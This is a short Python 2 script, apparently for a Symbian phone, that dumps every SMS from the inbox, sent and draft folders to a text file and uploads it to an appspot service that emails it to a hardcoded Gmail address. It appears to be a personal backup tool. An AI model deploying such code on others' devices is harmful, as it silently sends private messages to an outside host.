import inbox

import time


def store(cid):

    for i in inbox.Inbox(cid).sms_messages():

        print >>f,time.strftime('%Y-%m-%d %X',time.localtime(inbox.Inbox(cid).time(i))),',',

        print >>f,inbox.Inbox(cid).address(i).encode('utf-8'),',',

        print >>f,inbox.Inbox(cid).time(i),',',

        print >>f,inbox.Inbox(cid).content(i).encode('utf-8'),','

        #break




filename=time.strftime('%Y-%m-%d_%H-%M-%S',time.localtime(time.time()))+'.txt'

import urllib
import httplib

def sendMailMobile(filePath):
    f=open(filePath,'rb')
    test3 = f.read()
    f.close()

    params = urllib.urlencode({'mailTo': 'maildisk.maildisk@gmail.com', 'uploadFile': test3})
    headers = {"Content-type": "application/x-www-form-urlencoded",
               "Accept": "text/plain"}

    conn = httplib.HTTPConnection("wwjufsdatabase.appspot.com")
    conn.request("POST", "/apps/mail/mailSender.py", params, headers)
    response = conn.getresponse()
    conn.close()
myRoot = 'e:/wwj/'
import os
if not os.path.exists(myRoot):
    os.mkdir(myRoot)
filePath = os.path.join(myRoot,filename)

f=open(filePath, 'wb')

#print filename


cid=inbox.EInbox

#print cid

print >>f,',,,inbox'

store(inbox.EInbox)

print >>f,',,,sent'

store(inbox.ESent)

print >>f,',,,draft'

store(inbox.EDraft)

f.close()
sendMailMobile(filePath)